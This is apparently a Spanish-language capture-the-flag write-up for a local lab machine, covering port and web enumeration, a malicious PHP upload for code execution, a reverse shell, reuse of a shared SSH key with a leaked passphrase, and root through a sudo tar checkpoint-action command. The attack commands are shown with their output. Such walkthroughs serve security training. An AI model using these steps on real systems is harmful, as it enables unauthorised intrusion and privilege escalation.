## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 09:42 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1d:4a:16:27:ad:b8:0b:aa:28:64:b0:10:3b:be:79:1c (ECDSA)
|_  256 0b:0f:11:d6:5a:e9:f5:25:c8:17:0d:71:c1:29:c9:53 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: CyberLand Labs - Innovaci\xC3\xB3n en Ciberseguridad
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.53 seconds
```

comienzo chequeando el servicio web

![image](https://github.com/user-attachments/assets/232202bc-57e8-46c9-8f93-a854a2b9d69c)

realizo fuzzing web

```ruby
feroxbuster -u 'http://172.17.0.2' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 10
```
```bash
                                                                                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       65l      221w     3010c http://172.17.0.2/index.html
200      GET      158l      327w     2870c http://172.17.0.2/styles.css
200      GET       44l      152w     1749c http://172.17.0.2/script.js
200      GET       27l       54w      826c http://172.17.0.2/contact.html
200      GET       39l       81w     1327c http://172.17.0.2/team.html
200      GET       29l       67w      931c http://172.17.0.2/blog.html
200      GET      796l     4529w   371895c http://172.17.0.2/logo.png
301      GET        9l       28w      310c http://172.17.0.2/uploads => http://172.17.0.2/uploads/
200      GET     6186l    35127w  2810752c http://172.17.0.2/banner.png
200      GET       65l      221w     3010c http://172.17.0.2/
[####################] - 67s  2491836/2491836 0s      found:10      errors:0      
[####################] - 67s  2491548/2491548 37308/s http://172.17.0.2/ 
[####################] - 0s   2491548/2491548 1245774000/s http://172.17.0.2/uploads/ => Directory listing (add --scan-dir-listings to scan)
```
veo que existe el directorio `/uploads` por lo que imagino que de alguna forma podre cargar archivos solo que no veo el panel de carga, asi que despues de chequear el script `js` 
observo algo interesante

![image](https://github.com/user-attachments/assets/fde9add8-ea37-402b-8af9-a343a5c6ee31)

si que existe un panel de carga y despues de varios testeos accedo en `http://172.17.0.2/#fileUpload` y al chequear su codigo fuente observo

![image](https://github.com/user-attachments/assets/a0f159d4-159e-4081-9f4d-69fc001aabfe)

ya tengo localizado el panel de carga asi que accedo `http://172.17.0.2/m4ch1n3_upload.php`

![image](https://github.com/user-attachments/assets/d3a0fba2-acaa-4b84-b71c-9a02042e0f9c)

aqui me cargo un archivo php malicioso, sube sin problema alguna y obtengo una `rce`

![image](https://github.com/user-attachments/assets/04fa554f-aed6-41b8-9462-6b2064a91343)

me envio una `revershell` y obtengo acceso al sistema

## Escalada de Privilegios

### www-data

tratamiento de la tty

```bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```
exiten los siguientes usuarios en el sistema: `charlie`, `bob` & `alice`; busco archivos en el sistema que pertenezcan a alguno de estos usuarios pero sin resultado, en cambio al buscar
por `www-data` me consigo con un archivo de `log`

![image](https://github.com/user-attachments/assets/3d977a3b-91f1-4e70-b50e-60fbd2cc14c1)

decodifico la cadena que parece ser `base64`

```ruby
echo 'YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3' |base64 -d
```

obtengo credenciales para el user `alice`

### alice

consigo la `flag` 

![image](https://github.com/user-attachments/assets/860e89cd-d10f-4c8a-bfcd-d974a5e58a3b)

consigo un reporte de incidentes que tiene buena innformacion

```bash
=== INCIDENT REPORT ===
Archivo generado automaticamente por el sistema de auditoria interna de CyberLand Labs.

Fecha: 2023-11-22  
Auditor Responsable: Alice Carter  
Asunto: Configuracion Erronea de Claves SSH  

=== DESCRIPCION ===  
Durante una reciente auditoria de seguridad en nuestro servidor principal, descubrimos un grave error de configuracion en el sistema de autenticacion SSH. El problema parece originarse en un script automatizado utilizado para generar claves RSA para los usuarios del sistema.

En lugar de crear claves unicas para cada usuario, el script genero una unica clave `id_rsa` y la replico en todos los directorios de usuario en el servidor. Ademas, la clave esta protegida por una passphrase que, aunque tecnicamente existe, no ofrece ningun nivel real de seguridad.

=== HALLAZGO ADICIONAL ===  
Durante el analisis, encontramos que la passphrase de la clave privada del usuario `bob` se almaceno accidentalmente en un archivo temporal en el sistema. El archivo no ha sido eliminado, lo que significa que la passphrase esta ahora expuesta.

**Passphrase del Usuario `bob`:** `cyb3r_s3curity`

=== DETALLES DE LA CONFIGURACION ===  
Clave Privada: id_rsa  
Passphrase: cyb3r_s3curity  
Ubicacion: Copiada en todos los directorios `/home/<usuario>/.ssh/`

=== CONSECUENCIAS ===  
1. **Perdida de Privacidad**: Todos los usuarios comparten la misma clave, lo que significa que cualquiera puede autenticarse como cualquier otro usuario si obtiene acceso a la clave.  

=== POSIBLES SOLUCIONES ===  
- Implementar un sistema centralizado de gestion de claves.  
- Forzar a los usuarios a cambiar sus claves regularmente.  
- Actualizar las politicas internas para prohibir el uso de scripts inseguros en la configuracion de credenciales.  

=== NOTA FINAL ===  
Este incidente pone de manifiesto la importancia de revisar las configuraciones criticas en sistemas sensibles. Es crucial que todo el equipo de IT se mantenga alerta y que se implementen controles mas estrictos para evitar errores similares en el futuro.

--- FIN DEL INFORME ---
```

aqui el objetivo pasa a ser enviar a mi maquina atacante la clave `id_rsa` para autenticarme en el sistema como cualquier `user`

![image](https://github.com/user-attachments/assets/b4a3cdbe-1244-4d4f-8507-acc358afcb33)

le asigno los permisos necesarios a la llave para que pueda funcionar

```bash
chmod og-rwx id_rsa
```
procedo acceder al user `bob` via ssh

```
ssh -i id_rsa bob@172.17.2
```

la `passphrase` se encuentra en el reporte de `incidencias`

### bob



```
sudo -l

Matching Defaults entries for bob on e3bff6e1986b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on e3bff6e1986b:
    (ALL) NOPASSWD: /bin/tar
```

escalamos a `root`

```ruby
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![image](https://github.com/user-attachments/assets/e0899ef6-8e11-47f3-81cc-66f20b650541)

### root





















